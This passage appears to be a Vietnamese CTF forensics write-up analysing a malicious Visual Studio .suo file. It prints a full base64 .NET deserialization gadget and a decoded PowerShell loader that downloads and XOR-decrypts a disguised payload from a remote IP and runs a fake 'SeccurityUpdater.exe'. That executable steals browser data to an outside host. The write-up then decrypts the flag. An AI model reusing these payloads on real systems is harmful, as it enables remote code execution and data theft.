    │   │   └── 7a84a15a-2939-42c6-9ce3-86dd393af57a.vsidx
    │   └── v17
    │       ├── .futdcache.v2
    │       └── .suo
    └── ProjectEvaluation
        ├── helloworld.metadata.v9.bin
        ├── helloworld.projects.v9.bin
        └── helloworld.strings.v9.bin

```
- Check lần lượt qua tất cả các tệp, tại tệp .suo có 1 vài điểm đáng chú ý
- ![image](https://hackmd.io/_uploads/S1trw0yHyl.png)
- Ta thấy 1 vài đoạn base64 được cắt ra từng phần, sử dụng thêm hexed.it để lấy nó ra 
- ![image](https://hackmd.io/_uploads/HJY_bxlSJl.png)
```
AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAOUSL2MgcG93ZXJzaGVsbCAtZW5jICJTUUJ0QUhBQWJ3QnlBSFFBTFFCTkFHOEFaQUIxQUd3QVpRQWdBRTBBYVFCakFISUFid0J6QUc4QVpnQjBBQzRBVUFCdkFIY0FaUUJ5QUZNQWFBQmxBR3dBYkFBdUFFRUFjZ0JqQUdnQWFRQjJBR1VBT3dBa0FHMEFjd0FnQUQwQUlBQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQkpBRThBTGdCTkFHVUFiUUJ2QUhJQWVRQlRBSFFBY2dCbEFHRUFiUUE3QUNRQWNnQmxBSE1BY0FCdkFHNEFjd0JsQUNBQVBRQWdBRWtBYmdCMkFHOEFhd0JsQUMwQVZ3QmxBR0lBVWdCbEFIRUFkUUJsQUhNQWRBQWdBQzBBVlFCekFHVUFRZ0JoQUhNQWFRQmpBRkFBWVFCeUFITUFhUUJ1QUdjQUlBQXRBRlVBY2dCcEFDQUFJZ0JvQUhRQWRBQndBRG9BTHdBdkFERUFOUUEwQUM0QU1nQTJBQzRBTVFBekFEWUFMZ0F5QURJQU53QTZBRFFBTVFBNEFEY0FPUUF2QUcwQWFRQnJBSFVBWHdCb0FHUUFYd0IzQUdFQWJBQnNBSEFBWVFCd0FHVUFjZ0F1QUhBQWJnQm5BQ0lBT3dBa0FHSUFlUUIwQUdVQWN3QTlBRnNBWWdCNUFIUUFaUUJiQUYwQVhRQW9BQ1FBY2dCbEFITUFjQUJ2QUc0QWN3QmxBQzRBUXdCdkFHNEFkQUJsQUc0QWRBQXBBRHNBSkFCckFHVUFlUUFnQUQwQUlBQmJBR0lBZVFCMEFHVUFXd0JkQUYwQUtBQXdBSGdBT1FBNUFDd0FNQUI0QURRQU5nQXNBREFBZUFBeEFHVUFMQUF3QUhnQU13QmhBQ3dBTUFCNEFESUFPQUFzQURBQWVBQXpBR0VBTEFBd0FIZ0FNQUE0QUN3QU1BQjRBRGdBT0FBc0FEQUFlQUEwQURrQUxBQXdBSGdBWVFCaEFDd0FNQUI0QURNQVlRQXNBREFBZUFCbEFEY0FMQUF3QUhnQVl3QXpBQ3dBTUFCNEFESUFOZ0FzQURBQWVBQXhBR0VBTEFBd0FIZ0FOZ0ExQUN3QU1BQjRBREVBTkFBc0FEQUFlQUExQURnQUxBQXdBSGdBTkFCaEFDd0FNQUI0QURrQU9RQXNBREFBZUFBekFERUFMQUF3QUhnQVpRQTBBQ3dBTUFCNEFERUFZZ0FzQURBQWVBQXdBR0lBTEFBd0FIZ0FPUUJrQUN3QU1BQjRBR1VBWWdBc0FEQUFlQUF5QURFQUxBQXdBSGdBWWdBM0FDd0FNQUI0QURnQU1RQXNBREFBZUFBMkFHWUFMQUF3QUhnQVpnQTNBQ3dBTUFCNEFEWUFOZ0FwQURzQVpnQnZBSElBSUFBb0FDUUFhUUFnQUQwQUlBQXdBRHNBSUFBa0FHa0FJQUF0QUd3QWRBQWdBQ1FBWWdCNUFIUUFaUUJ6QUM0QVRBQmxBRzRBWndCMEFHZ0FPd0FnQUNRQWFRQXJBQ3NBS1FBZ0FIc0FJQUFnQUNBQUlBQWtBR0lBZVFCMEFHVUFjd0JiQUNRQWFRQmRBQ0FBUFFBZ0FGc0FZZ0I1QUhRQVpRQmRBQ2dBSkFCaUFIa0FkQUJsQUhNQVd3QWtBR2tBWFFBZ0FDMEFZZ0I0QUc4QWNnQWdBQ1FBYXdCbEFIa0FXd0FrQUdrQUlBQWxBQ0FBSkFCckFHVUFlUUF1QUV3QVpRQnVBR2NBZEFCb0FGMEFLUUE3QUgwQU93QWtBRzBBY3dBdUFGY0FjZ0JwQUhRQVpRQW9BQ1FBWWdCNUFIUUFaUUJ6QUN3QUlBQXdBQ3dBSUFBa0FHSUFlUUIwQUdVQWN3QXVBRXdBWlFCdUFHY0FkQUJvQUNrQU93QWtBRzBBY3dBdUFGTUFaUUJsQUdzQUtBQXdBQ3dBSUFCYkFGTUFlUUJ6QUhRQVpRQnRBQzRBU1FCUEFDNEFVd0JsQUdVQWF3QlBBSElBYVFCbkFHa0FiZ0JkQURvQU9nQkNBR1VBWndCcEFHNEFLUUE3QUNRQVpnQXhBRUVBWndBeEFGOEFZZ0JoQUhNQVpRQXpBRElBUFFBaUFFc0FOQUJaQUZnQVZ3QXpBRklBVVFCTUFEVUFWZ0JVQUVjQVZ3QkxBRGNBVGdCYUFFZ0FWZ0EyQUZVQVJBQlRBQ0lBT3dBa0FIUUFiUUJ3QUNBQVBRQWdBRnNBVXdCNUFITUFkQUJsQUcwQUxnQkpBRThBTGdCUUFHRUFkQUJvQUYwQU9nQTZBRWNBWlFCMEFGUUFaUUJ0QUhBQVVBQmhBSFFBYUFBb0FDa0FPd0FrQUhRQWJRQndBREVBSUFBOUFDQUFKQUIwQUcwQWNBQXhBQ0FBS3dBZ0FDSUFiQUJ0QUdFQWJ3QjRBR1FBTGdCNkFHa0FjQUFpQURzQVd3QlRBSGtBY3dCMEFHVUFiUUF1QUVrQVR3QXVBRVlBYVFCc0FHVUFYUUE2QURvQVZ3QnlBR2tBZEFCbEFFRUFiQUJzQUVJQWVRQjBBR1VBY3dBb0FDUUFkQUJ0QUhBQU1RQXNBQ0FBSkFCdEFITUFMZ0JVQUc4QVFRQnlBSElBWVFCNUFDZ0FLUUFwQURzQVJRQjRBSEFBWVFCdUFHUUFMUUJCQUhJQVl3Qm9BR2tBZGdCbEFDQUFMUUJRQUdFQWRBQm9BQ0FBSkFCMEFHMEFjQUF4QUNBQUxRQkVBR1VBY3dCMEFHa0FiZ0JoQUhRQWFRQnZBRzRBVUFCaEFIUUFhQUFnQUNRQWRBQnRBSEFBSUFBdEFFWUFid0J5QUdNQVpRQTdBRk1BZEFCaEFISUFkQUF0QUZBQWNnQnZBR01BWlFCekFITUFJQUF0QUVZQWFRQnNBR1VBVUFCaEFIUUFhQUFnQUNnQUpBQjBBRzBBY0FBZ0FDc0FJQUFpQUZNQVpRQmpBR01BZFFCeUFHa0FkQUI1QUZVQWNBQmtBR0VBZEFCbEFISUFMZ0JsQUhnQVpRQWlBQ2tBSUFBdEFFNEFid0JPQUdVQWR3QlhBR2tBYmdCa0FHOEFkd0E3QUZJQVpRQnRBRzhBZGdCbEFDMEFTUUIwQUdVQWJRQWdBQ1FBZEFCdEFIQUFNUUE3QUE9PSIGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw==
```
- Đây là mã sau khi decode 

```
....powershell -enc "SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAE0AaQBjAHIAbwBzAG8AZgB0AC4AUABvAHcAZQByAFMAaABlAGwAbAAuAEEAcgBjAGgAaQB2AGUAOwAkAG0AcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7ACQAcgBlAHMAcABvAG4AcwBlACAAPQAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvADEANQA0AC4AMgA2AC4AMQAzADYALgAyADIANwA6ADQAMQA4ADcAOQAvAG0AaQBrAHUAXwBoAGQAXwB3AGEAbABsAHAAYQBwAGUAcgAuAHAAbgBnACIAOwAkAGIAeQB0AGUAcwA9AFsAYgB5AHQAZQBbAF0AXQAoACQAcgBlAHMAcABvAG4AcwBlAC4AQwBvAG4AdABlAG4AdAApADsAJABrAGUAeQAgAD0AIABbAGIAeQB0AGUAWwBdAF0AKAAwAHgAOQA5ACwAMAB4ADQANgAsADAAeAAxAGUALAAwAHgAMwBhACwAMAB4ADIAOAAsADAAeAAzAGEALAAwAHgAMAA4ACwAMAB4ADgAOAAsADAAeAA0ADkALAAwAHgAYQBhACwAMAB4ADMAYQAsADAAeABlADcALAAwAHgAYwAzACwAMAB4ADIANgAsADAAeAAxAGEALAAwAHgANgA1ACwAMAB4ADEANAAsADAAeAA1ADgALAAwAHgANABhACwAMAB4ADkAOQAsADAAeAAzADEALAAwAHgAZQA0ACwAMAB4ADEAYgAsADAAeAAwAGIALAAwAHgAOQBkACwAMAB4AGUAYgAsADAAeAAyADEALAAwAHgAYgA3ACwAMAB4ADgAMQAsADAAeAA2AGYALAAwAHgAZgA3ACwAMAB4ADYANgApADsAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAIAAgACAAIAAkAGIAeQB0AGUAcwBbACQAaQBdACAAPQAgAFsAYgB5AHQAZQBdACgAJABiAHkAdABlAHMAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AKQA7AH0AOwAkAG0AcwAuAFcAcgBpAHQAZQAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAOwAkAG0AcwAuAFMAZQBlAGsAKAAwACwAIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwBlAGUAawBPAHIAaQBnAGkAbgBdADoAOgBCAGUAZwBpAG4AKQA7ACQAZgAxAEEAZwAxAF8AYgBhAHMAZQAzADIAPQAiAEsANABZAFgAVwAzAFIAUQBMADUAVgBUAEcAVwBLADcATgBaAEgAVgA2AFUARABTACIAOwAkAHQAbQBwACAAPQAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGEAdABoAF0AOgA6AEcAZQB0AFQAZQBtAHAAUABhAHQAaAAoACkAOwAkAHQAbQBwADEAIAA9ACAAJAB0AG0AcAAxACAAKwAgACIAbABtAGEAbwB4AGQALgB6AGkAcAAiADsAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAEIAeQB0AGUAcwAoACQAdABtAHAAMQAsACAAJABtAHMALgBUAG8AQQByAHIAYQB5ACgAKQApADsARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAJAB0AG0AcAAxACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AUABhAHQAaAAgACQAdABtAHAAIAAtAEYAbwByAGMAZQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACgAJAB0AG0AcAAgACsAIAAiAFMAZQBjAGMAdQByAGkAdAB5AFUAcABkAGEAdABlAHIALgBlAHgAZQAiACkAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwA7AFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAdABtAHAAMQA7AA==".....
```
- ![image](https://hackmd.io/_uploads/r1MkfxeHke.png)
```
Import-Module Microsoft.PowerShell.Archive;$ms = New-Object System.IO.MemoryStream;$response = Invoke-WebRequest -UseBasicParsing -Uri "http://154.26.136.227:41879/miku_hd_wallpaper.png";$bytes=[byte[]]($response.Content);$key = [byte[]](0x99,0x46,0x1e,0x3a,0x28,0x3a,0x08,0x88,0x49,0xaa,0x3a,0xe7,0xc3,0x26,0x1a,0x65,0x14,0x58,0x4a,0x99,0x31,0xe4,0x1b,0x0b,0x9d,0xeb,0x21,0xb7,0x81,0x6f,0xf7,0x66);for ($i = 0; $i -lt $bytes.Length; $i++) {    $bytes[$i] = [byte]($bytes[$i] -bxor $key[$i % $key.Length]);};$ms.Write($bytes, 0, $bytes.Length);$ms.Seek(0, [System.IO.SeekOrigin]::Begin);$f1Ag1_base32="K4YXW3RQL5VTGWK7NZHV6UDS";$tmp = [System.IO.Path]::GetTempPath();$tmp1 = $tmp1 + "lmaoxd.zip";[System.IO.File]::WriteAllBytes($tmp1, $ms.ToArray());Expand-Archive -Path $tmp1 -DestinationPath $tmp -Force;Start-Process -FilePath ($tmp + "SeccurityUpdater.exe") -NoNewWindow;Remove-Item $tmp1;
```
> Part 1 : W1{n0_k3Y_nO_Pr
- Nhìn vào đoạn mã ta thấy 1 file exe được tạo sau khi xor miku_hd_wallpaper.png với mảng key. Bây giờ dùng cyberchef để lấy file thực thi
- ![image](https://hackmd.io/_uploads/B11Q4xeB1l.png)
- ![image](https://hackmd.io/_uploads/ryt_NggHkg.png)
- Load nó vào dnspy, hàm main có 1 hàm fbuiawb1923 được thực thi 
```
// Program
// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
private static void Main()
{
	DialogResult dialogResult = MessageBox.Show("Do you want to run the security update?", "Windows Update", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
	bool flag = !AaKfkasaf.kaicenat();
	if (flag)
	{
		Console.WriteLine("L sandboxing");
		Environment.Exit(0);
	}
	jajkldaslkjdlk.fbuiawb1923();
}

```
- ![image](https://hackmd.io/_uploads/BJGB2xgHJl.png)
- Hàm này lấy cắp dữ liệu trình duyệt, sau đó gửi buffer và nội dung đến `154.26.136.227:57281`
- ![image](https://hackmd.io/_uploads/B1uc2lgByg.png)
- Ở đây ta có thêm 1 biến flag2 
- ![image](https://hackmd.io/_uploads/BJdsnleBke.png)
- ![image](https://hackmd.io/_uploads/H1GhhgxB1g.png)
> Part2 : 0b1Em!!!!_this
- ![image](https://hackmd.io/_uploads/rJm8pxgBye.png)
- Buffer là : 
```
4188b6cde96d0eeb8ab76375000ebd7bd192e770783a384f2b783f1d2962b50bbd6eb736e811e3232e8ce4a29bd1fd4a1f714906fb70d67a0e1539173d7b831e951a3ccc17f72b6584d289af5d53b9bce68d832060e760197c599914354bbd427f4ff8d408e7d19359d436fdb04581ef5b2350d365151ed7afd72783cc33681cf406b6220a04f6a4a7f9add5b93298b1263e8802e4e0b869c245c217991bb38e411dcce33e4898ce1d6e217877fe6d3c809a5a695c2193db9661ea8bd27a2cefe41178dc9aff4878bb73602c15a113070a85b1c854b186a58fc30c9980b795c55375ab6143d4dbe404d452e0ae7a730d5312d029f72dca0cf9b30b6934678cb9a0863ca2c8438ed483acff3243cb0acd98a779166dec6d12e11a7edad26ada6d20385f5240d10de32f16eb17bb924d06f2c439a8abb71a5aaebe9e841cd50d4f29c4f1ab88d30dfaeb07ec64405d212b41b7bd73f73550cdcc1f8ac800
```
- Ở jkabkw182asd ta có 1 public key để mã hoá RSA 
```
<RSAKeyValue><Modulus>q15sPNuEEmXnxko2yBBixhTcGCmX9LkGlhGjQ6yEIRrkNQjDybH+FL1pRN/U5SfM3yL6U92KBtOTzCk+lOeT9MfurVA9EKYpUfBCbS1Y7A0EkFlu66uLVs/QWclPluo+SJaLi8c84qDcLy9Sy4hqWpcB8QdKjZWXscvOnJEmv9NvbYeJrZM8Y9/yk+mvNRjLesTW+9KjBtQ+T8pYzFMXgNRPzQROytujeN4mM2Rejk1pCzsusJ0i4jzXl/tkgGtGtFjn0sy7Je114wOihdy+xox5blBSwG/qALcJj+Jnt2HMtaytM5nRa9gv8GlkTPH0UzsosalRQ/U2t3Dz0aXaVRwKuPFx8/UnTjT75jM3AKHB1KNiKCjNwPX8bGARly1Kszmsg3xDdUp5sCWsuRlSwxvKUVFD7Alxwsx3MinQdO91oZWEKNGdbJ/qm76gWPYKDanSKC2cRYGoT3hWEpPGS1uwnrz/tjyk8XLO+ZcbAIs0UeeykgpkZXzyKzq4u79pTnb0ma992sr/RtICBe8j5qER7K/1oGWGYMW87Pd86ZGMFv6NUNJ58rvxPHUKsD/3ydGmzrTnjKNuR5pkc2tUnTrSRM0pGiqrU84y2f7Cru+glGS2xG+sQnoz8XF+SIQ5zFR0+l/aGlbvDYKatzR6J5fvBxTD0/S03cm3wv0vKWM=</Modulus><Exponent>Cw==</Exponent></RSAKeyValue>
```
- Bây giờ viết script giải mã 
```
from xml.etree.ElementTree import fromstring
from base64 import b64decode
from sage.all import *
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb

pubkey = "<RSAKeyValue><Modulus>q15sPNuEEmXnxko2yBBixhTcGCmX9LkGlhGjQ6yEIRrkNQjDybH+FL1pRN/U5SfM3yL6U92KBtOTzCk+lOeT9MfurVA9EKYpUfBCbS1Y7A0EkFlu66uLVs/QWclPluo+SJaLi8c84qDcLy9Sy4hqWpcB8QdKjZWXscvOnJEmv9NvbYeJrZM8Y9/yk+mvNRjLesTW+9KjBtQ+T8pYzFMXgNRPzQROytujeN4mM2Rejk1pCzsusJ0i4jzXl/tkgGtGtFjn0sy7Je114wOihdy+xox5blBSwG/qALcJj+Jnt2HMtaytM5nRa9gv8GlkTPH0UzsosalRQ/U2t3Dz0aXaVRwKuPFx8/UnTjT75jM3AKHB1KNiKCjNwPX8bGARly1Kszmsg3xDdUp5sCWsuRlSwxvKUVFD7Alxwsx3MinQdO91oZWEKNGdbJ/qm76gWPYKDanSKC2cRYGoT3hWEpPGS1uwnrz/tjyk8XLO+ZcbAIs0UeeykgpkZXzyKzq4u79pTnb0ma992sr/RtICBe8j5qER7K/1oGWGYMW87Pd86ZGMFv6NUNJ58rvxPHUKsD/3ydGmzrTnjKNuR5pkc2tUnTrSRM0pGiqrU84y2f7Cru+glGS2xG+sQnoz8XF+SIQ5zFR0+l/aGlbvDYKatzR6J5fvBxTD0/S03cm3wv0vKWM=</Modulus><Exponent>Cw==</Exponent></RSAKeyValue>"
n = fromstring(pubkey).find('Modulus').text
e = fromstring(pubkey).find('Exponent').text
n = b64decode(n)
e = b64decode(e)
n = btl(n)
e = btl(e)
print(n)
print(e)

c = bytes.fromhex('4188b6cde96d0eeb8ab76375000ebd7bd192e770783a384f2b783f1d2962b50bbd6eb736e811e3232e8ce4a29bd1fd4a1f714906fb70d67a0e1539173d7b831e951a3ccc17f72b6584d289af5d53b9bce68d832060e760197c599914354bbd427f4ff8d408e7d19359d436fdb04581ef5b2350d365151ed7afd72783cc33681cf406b6220a04f6a4a7f9add5b93298b1263e8802e4e0b869c245c217991bb38e411dcce33e4898ce1d6e217877fe6d3c809a5a695c2193db9661ea8bd27a2cefe41178dc9aff4878bb73602c15a113070a85b1c854b186a58fc30c9980b795c55375ab6143d4dbe404d452e0ae7a730d5312d029f72dca0cf9b30b6934678cb9a0863ca2c8438ed483acff3243cb0acd98a779166dec6d12e11a7edad26ada6d20385f5240d10de32f16eb17bb924d06f2c439a8abb71a5aaebe9e841cd50d4f29c4f1ab88d30dfaeb07ec64405d212b41b7bd73f73550cdcc1f8ac800')
c = btl(c)

m = int(ZZ(c).nth_root(e))
print(ltb(m).hex(), len(ltb(m))) 
```
- ![image](https://hackmd.io/_uploads/rJ_qg-xSJx.png)
- Vậy ta có key để giải mã là 31d92547fcf97ae5a29534e884a848780dcd86c4606ea824fe2419f1d8640f92 
- ![image](https://hackmd.io/_uploads/rkqO-WeH1e.png)
```Part3 : _should_be_an_ez_game_UwU~~}```
> Flag : W1{n0_k3Y_nO_Pr0b1Em!!!_this_should_be_an_ez_game_UwU~~}

